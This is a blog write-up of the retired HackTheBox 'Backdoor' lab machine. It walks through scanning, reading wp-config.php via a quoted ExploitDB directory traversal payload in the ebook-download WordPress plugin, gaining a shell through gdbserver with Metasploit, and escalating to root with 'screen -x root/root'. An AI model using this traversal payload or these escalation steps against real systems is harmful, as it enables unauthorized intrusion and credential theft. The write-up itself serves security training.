---
title: "HackTheBox Backdoor Write-Up"
date: 2022-04-23
slug: hackthebox-backdoor-write-up
excerpt: "The Backdoor machine on HackTheBox has just retired! This is my write-up about the Backdoor machine on HackTheBox. Here I detail the penetration testing steps…"
source: https://blog.nicpwns.com/hackthebox-backdoor-write-up-29d3d448d322
tags: ["hackthebox"]
---

The Backdoor machine on HackTheBox has just retired! This is my write-up about the Backdoor machine on HackTheBox. Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is categorized as easy and was retired on April 23, 2022.

![](/writeups/hackthebox-backdoor-write-up/img-1.png)

## Backdoor Summary

![Backdoor logo.](/writeups/hackthebox-backdoor-write-up/img-2.png)

### Target Information

**IP Address:** 10.10.11.125  
**Hostname:** backdoor.htb

### Synopsis

A vulnerable WordPress plugin allows for local file inclusion. Local file inclusion provides read access to identify a GDB service running on a special port. The GDB service can be exploited for code execution and initial access. The screen utility with SUID allows for connection to an active root-level terminal session for root privileges.

## Scanning

### Nmap

The Nmap scan shows that there is an HTTP server on port `80/tcp` and some interesting service on port `1337/tcp`.

```
# nmap -sV -sC -p- 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 17:41 EDT
Nmap scan report for 10.10.11.125
Host is up (0.069s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.18 seconds
```

### HTTP

We can see that the website is a plain site running on port `80/tcp`. Nothing here of interest.

![Backdoor website landing.](/writeups/hackthebox-backdoor-write-up/img-3.png)

*Backdoor website landing.*

### Nikto

Nikto tells us that there is WordPress running on the target and that a few interesting directories are available.

```
# nikto --host http://10.10.11.125/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.125
+ Target Hostname:    10.10.11.125
+ Target Port:        80
+ Start Time:         2022-04-22 17:41:43 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with multiple values: (<http://10.10.11.125/index.php/wp-json/>; rel="https://api.w.org/",<http://10.10.11.125/index.php/wp-json/wp/v2/pages/11>; rel="alternate"; type="application/json",<http://10.10.11.125/>; rel=shortlink,)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 7889 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-04-22 17:50:14 (GMT-4) (511 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Gobuster

Gobuster shows a few more interesting WordPress directories to check out.

```
# gobuster dir -u http://10.10.11.125/ -w /usr/share/wordlists/dirpwn.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.125/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirpwn.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/22 17:41:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.11.125/]
/server-status        (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.11.125/wp-admin/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.11.125/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.11.125/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.11.125/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
===============================================================
2022/04/22 18:03:36 Finished
===============================================================
```

### WPScan

WPScan provided a lot of information, some of which I cut here to save space. The key information it found was a vulnerable ebook-download plugin.

```
# wpscan --url http://10.10.11.125/ -e ap,u --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[+] URL: http://10.10.11.125/ [10.10.11.125]
[+] Started: Fri Apr 22 17:43:29 2022
Interesting Finding(s):
-----SNIP-----
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:19:43 <========================================================================> (97836 / 97836) 100.00% Time: 00:19:43
[+] Checking Plugin Versions (via Passive and Aggressive Methods)
[i] Plugin(s) Identified:
[+] ebook-download
 | Location: http://10.10.11.125/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00
[i] User(s) Identified:
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[+] Finished: Fri Apr 22 18:03:33 2022
[+] Requests Done: 97915
[+] Cached Requests: 7
[+] Data Sent: 26.27 MB
[+] Data Received: 28.875 MB
[+] Memory used: 468.273 MB
[+] Elapsed time: 00:20:04
```

## Exploit

The identified “ebook-download” plugin can be accessed directly with a directory listing.

![Directory listing for WordPress plugins.](/writeups/hackthebox-backdoor-write-up/img-4.png)

*Directory listing for WordPress plugins.*

Looking at the plugin’s readme, we can see it is version 1.1.

![Readme.txt for ebook-download plugin showing version 1.1.](/writeups/hackthebox-backdoor-write-up/img-5.png)

*Readme.txt for ebook-download plugin showing version 1.1.*

A directory traversal vulnerability is present in “ebook-download” version 1.1 and there is an exploit available in [ExploitDB](https://www.exploit-db.com/exploits/39575). Let’s try it.

### WordPress Plugin eBook Download 1.1 — Directory Traversal

```
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7

[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================

[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

Run the exploit from ExploitDB.

![Successfully viewing wp-config.php using local file inclusion vulnerability.](/writeups/hackthebox-backdoor-write-up/img-6.png)

*Successfully viewing wp-config.php using local file inclusion vulnerability.*

The exploit works! We’re able to read local files on the target. We can even get the WordPress database password but this won’t do any good because we don’t have a way to access the database. There doesn’t seem to be any password reuse for SSH or the WordPress admin login either. Some other file will need to be read to gain initial access.

### Brute-Force /proc

This [blog post](https://zsahi.wordpress.com/2018/09/10/file-inclusion/) suggests brute-forcing the `/proc` directory for different PIDs to identify running services on the system. Remember, *everything* in Linux is a file. This may help us identify what service is really running on port `1337/tcp`!

Using Burp Suite Intruder, I brute-forced web requests to identify any possible PIDs running a service on the target. The directory checked was `/proc/[PID]/cmdline`. I eventually got a hit! PID 844 showed `gdbserver` listening on port `1337/tcp`. That's our target service.

![Using Burp Suite Intruder to identify gdbserver running on PID 844.](/writeups/hackthebox-backdoor-write-up/img-7.png)

*Using Burp Suite Intruder to identify gdbserver running on PID 844.*

### Metasploit Console

A quick Google search for connecting to `gdbserver` revealed that there is a [Metasploit module](https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/) to obtain a shell on the target. A quick Metasploit setup was needed and then I had initial user-level access to the target.

![Using Metasploit Console to obtain a Meterpreter shell.](/writeups/hackthebox-backdoor-write-up/img-8.png)

*Using Metasploit Console to obtain a Meterpreter shell.*

## Enumeration

Going through my normal privilege escalation processes of checking sudo, SUIDs, writable files, etc. I eventually came around to running [Pspy](https://github.com/DominicBreuker/pspy) to see if I could pick up on any processes running that I didn’t see before. I ended up seeing an interesting `screen` command running with the name of root.

![Using Pspy to identify an interesting screen process running.](/writeups/hackthebox-backdoor-write-up/img-9.png)

*Using Pspy to identify an interesting screen process running.*

Pairing this information with seeing SUID set for `screen` in my previous enumeration, this looked like a privilege escalation route.

![Checking for binaries with SUID bits set.](/writeups/hackthebox-backdoor-write-up/img-10.png)

*Checking for binaries with SUID bits set.*

## Root

Checking the help menu for `screen` showed an interesting `-x` option that allows us to "Attach to a not detached screen."

![Viewing the help menu for screen to identify the -x argument.](/writeups/hackthebox-backdoor-write-up/img-11.png)

*Viewing the help menu for screen to identify the -x argument.*

At first, attempting this in my Meterpreter shell caused some issues, so I had to upgrade my shell and work through those issues first.

![Screen requires connection to a terminal.](/writeups/hackthebox-backdoor-write-up/img-12.png)

*Screen requires connection to a terminal.*

![Upgrading Meterpreter shell with using a Python trick.](/writeups/hackthebox-backdoor-write-up/img-13.png)

*Upgrading Meterpreter shell with using a Python trick.*

![Screen requires a terminal type to be set.](/writeups/hackthebox-backdoor-write-up/img-14.png)

*Screen requires a terminal type to be set.*

Setting a terminal type then running the following command worked!

```
export TERM=xterm
screen -x root/root
```

We have the root-level shell.

![Obtaining a root shell.](/writeups/hackthebox-backdoor-write-up/img-15.png)

*Obtaining a root shell.*

## Loot

Other than the points on HackTheBox, the lessons learned are the real treasures for this box.

1.  Using file read vulnerabilities to check for running processes in `/proc` is extremely valuable! The methodology used for this box, and other methodologies like the one [mentioned here](https://xen0vas.github.io/Exploiting-the-LFI-vulnerability-using-the-proc-self-stat-method/#) are very useful when trying to gain initial access from a file read vulnerability.
2.  [Pspy](https://github.com/DominicBreuker/pspy) is awesome. As much as Pspy always seems to be a last resort for me, it always wins. The tool gives visibility into activity on the box that you would never see otherwise.

![](/writeups/hackthebox-backdoor-write-up/img-16.png)

Thank you for reading my write-up for the Backdoor machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
